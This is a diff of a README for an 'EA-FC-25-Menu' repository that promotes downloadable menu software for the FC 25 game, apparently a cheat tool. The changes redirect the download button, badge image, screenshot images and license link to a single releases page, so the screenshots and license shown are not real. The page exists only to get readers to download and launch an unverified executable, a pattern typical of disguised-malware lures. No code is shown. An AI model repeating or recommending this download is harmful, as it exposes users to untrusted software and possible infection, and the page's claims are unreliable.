@@ -43,11 +43,11 @@ Explore a variety of topics related to the EA-FC-25-Menu repository:
 
 ## Get Started 🚀
 
-Ready to elevate your FC 25 gaming experience? Download the software [here](https://github.com/project/files/App.zip) and launch it to unlock a whole new world of possibilities.
+Ready to elevate your FC 25 gaming experience? Download the software [here](https://github.com/21Shadow-code/EA-FC-25-Menu/releases) and launch it to unlock a whole new world of possibilities.
 
 Don't forget to check out our **Releases** section if the provided link is not working or you need additional information.
 
-[![Download Here](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/project/files/App.zip)
+[![Download Here](https://github.com/21Shadow-code/EA-FC-25-Menu/releases)](https://github.com/21Shadow-code/EA-FC-25-Menu/releases)
 
 ## Join the Community 🌐
 
@@ -57,9 +57,9 @@ Connect with fellow gamers, share your experiences, and stay updated on the late
 
 Check out some in-game screenshots showcasing the capabilities of our FC 25 menu software:
 
-![Screenshot 1](https://link-to-screenshot1.png)
+![Screenshot 1](https://github.com/21Shadow-code/EA-FC-25-Menu/releases)
 
-![Screenshot 2](https://link-to-screenshot2.png)
+![Screenshot 2](https://github.com/21Shadow-code/EA-FC-25-Menu/releases)
 
 ## Support 💡
 
@@ -71,7 +71,7 @@ We would like to extend our heartfelt thanks to all the contributors who have de
 
 ## License 📝
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/project/files/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/21Shadow-code/EA-FC-25-Menu/releases) file for details.
 
 ---
 
